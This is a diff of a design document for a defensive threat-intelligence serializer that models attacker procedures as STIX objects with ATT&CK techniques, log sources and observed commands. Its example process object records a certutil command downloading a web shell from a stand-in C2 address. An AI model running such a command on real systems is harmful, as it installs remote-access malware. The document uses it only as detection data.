@@ -56,7 +56,9 @@ A procedure is well-formed when three sets are non-empty, `P = { AP, LS, ⟨C⟩
   against the catalogue. An unresolvable technique is omitted, never invented.
 - **LS**, `x_log_source_refs`: where a defender would see it, derived from
   ATT&CK's own detection chain (technique → detection strategy → analytic →
-  data component).
+  data component), read from the catalogue in Neo4j when the bundle is
+  serialized. Without the catalogue the property is absent, and the tuple
+  check grades that as an error at confidence 70 or above.
 - **⟨C⟩**, `x_components_refs`: the ordered observables that constitute it, a
   `process` per command line the source actually printed, with the binary it
   ran as a `file`.
@@ -64,33 +66,63 @@ A procedure is well-formed when three sets are non-empty, `P = { AP, LS, ⟨C⟩
 Every procedure is a unique observation. The same behavior in two reports is
 two objects with the same name, different ids and different source refs;
 `x_fingerprint` groups them at query time and nothing merges them at write
-time. Abridged from real serializer output on a synthetic fixture:
+time. Abridged from the output of
+`backend/scripts/render_procedure_example.py`, which runs the serializer over
+the synthetic fixture in `tests/conftest.py` against the local ATT&CK
+catalogue; ids are shortened and `created`, `modified` and `created_by_ref`
+are left out:
 
 ```json
 {
   "type": "x-procedure",
-  "id": "x-procedure--5e04f60d-2ebe-4d3d-a5f4-2d1fff629516",
+  "spec_version": "2.1",
+  "id": "x-procedure--df68971c-f0a5-41e3-8701-da6b2dfa3b7b",
   "name": "Download web shell via certutil",
   "description": "The actor used certutil.exe to download a web shell from the C2 server.",
   "extensions": {
     "extension-definition--b422519e-c47a-439d-9195-0f16b94fa889": { "extension_type": "new-sdo" }
   },
-  "x_technique_refs": ["attack-pattern--8d267313-…", "attack-pattern--66f5262d-…"],
-  "x_platforms": ["windows::server"],
+  "x_technique_refs": ["attack-pattern--d1fcf083-…", "attack-pattern--e6919abc-…"],
+  "kill_chain_phases": [
+    { "kill_chain_name": "mitre-attack", "phase_name": "execution" },
+    { "kill_chain_name": "mitre-attack", "phase_name": "command-and-control" }
+  ],
+  "x_platforms": ["Windows::Server"],
   "confidence": 78,
-  "x_source_refs": ["identity--9f6a692e-…"],
+  "x_source_refs": ["identity--9f0c304b-…"],
   "x_procedure_type": "reporting",
-  "x_fingerprint": "f152cefe0cd06a3a5e9c4770a5ada269",
-  "x_components_refs": ["process--14cb5655-…"]
+  "x_source_provenance": "paraphrased",
+  "x_fingerprint": "6bfba316fbde6dfbf96c929160c98060",
+  "x_components_refs": ["process--c6841fd5-…"],
+  "x_log_source_refs": [
+    "x-log-source--0bf9f575-…", "x-log-source--2e0e85e0-…", "x-log-source--335659bd-…",
+    "x-log-source--5a65bd16-…", "x-log-source--844aa3eb-…", "x-log-source--9278ebe5-…",
+    "x-log-source--b69216d6-…"
+  ]
 }
 ```
 
 ```json
 {
   "type": "process",
-  "id": "process--14cb5655-000c-409d-96e0-ba75c72fea54",
+  "id": "process--c6841fd5-6213-4d26-accd-22e7eec2deec",
   "command_line": "certutil.exe -urlcache -split -f http://203.0.113.10/shell.jsp",
   "x_exe_name": "certutil.exe"
+}
+```
+
+One of its seven log sources, an ATT&CK data component projected onto the
+procedure. The other six are Process Creation, Module Load, Command
+Execution, File Creation, Network Connection Creation and Network Traffic
+Flow:
+
+```json
+{
+  "type": "x-log-source",
+  "id": "x-log-source--335659bd-bff4-45ec-8b29-f559af123b2a",
+  "name": "Script Execution",
+  "description": "The execution of a text file that contains code via the interpreter.",
+  "x_mitre_data_component_ref": "x-mitre-data-component--9f387817-df83-432a-b56b-a8fb7f71eedd"
 }
 ```
 
